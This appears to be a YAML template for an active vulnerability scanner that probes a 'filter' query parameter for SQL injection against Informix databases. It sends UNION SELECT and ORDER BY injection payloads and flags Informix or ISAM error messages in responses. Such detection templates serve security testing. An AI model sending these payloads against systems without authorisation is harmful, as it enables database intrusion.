id: sqli6-informix-13
name: 'SQLi informix probe in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - ''' UNION SELECT NULL,NULL,NULL--'
        - '1'' ORDER BY 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
